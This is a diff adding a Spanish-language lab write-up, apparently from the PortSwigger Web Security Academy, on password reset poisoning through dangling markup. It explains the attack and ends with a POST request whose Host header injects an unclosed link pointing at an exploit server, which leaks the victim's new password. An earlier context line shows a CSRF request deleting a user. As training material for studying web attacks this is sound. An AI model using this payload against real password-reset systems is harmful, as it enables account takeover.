@@ -113,3 +113,26 @@ La segunda que se mandan a la vez agrupada es:
 GET /admin/delete?username=carlos&csrf=feZOoSk9ujMEIdTa5a3mdlxIQ957LHIz HTTP/1.1
 Host: 192.168.0.1
 ```
+
+## Reto 7: Envenenamiento por restablecimiento de contraseña mediante código HTML colgante
+
+Este laboratorio es vulnerable al envenenamiento de contraseñas mediante código HTML suelto. Para resolverlo, inicia sesión en la cuenta de Carlos.
+
+Puedes iniciar sesión en tu cuenta utilizando las siguientes credenciales: wiener:peterCualquier correo electrónico enviado a esta cuenta puede ser leído a través del cliente de correo electrónico en el servidor explotado.
+
+Un ataque avanzado de password reset poisoning mediante la técnica de dangling markup, que aprovecha cómo se renderizan los correos en su formato HTML crudo.
+
+El laboratorio parte del hecho de que al solicitar un reseteo de contraseña, el nuevo password no se entrega mediante un enlace con token, sino que es enviado directamente en el cuerpo del correo. Este contenido es renderizado de forma segura usando DOMPurify, pero la versión “raw” del correo en HTML no pasa por ningún tipo de sanitización, lo que abre la puerta al ataque.
+
+El atacante manipula la cabecera Host en la solicitud POST de recuperación de contraseña, agregando una cadena especialmente construida que introduce una etiqueta HTML sin cerrar (<a href=…). Esto provoca que el navegador del destinatario —en este caso, el visor de correo del laboratorio— intente completar el HTML truncado enviando el resto de la información (incluyendo la nueva contraseña generada) como parte de una solicitud al servidor del atacante (exploit server).
+
+En concreto, se rompe la estructura del href con un puerto falso o un carácter especial, y luego se inyecta una dirección apuntando al exploit server. Como resultado, el contenido que debería quedar en el cuerpo del correo (incluyendo la contraseña de Carlos) se convierte en parte de la URL de la solicitud enviada al servidor del atacante.
+
+Finalmente, el atacante accede al exploit server, revisa los registros, recupera la nueva contraseña de Carlos y accede con sus credenciales.
+```
+POST /forgot-password HTTP/2
+
+Host: 0a6700bd048834cf80b703be00610092.web-security-academy.net:'<a href="https://exploit-0a49009b04ef34e080a202f701f00041.exploit-server.net/?
+
+csrf=XYXxkoiLEBYpbRquZu5RjWI3rkVocT30&username=carlos
+```
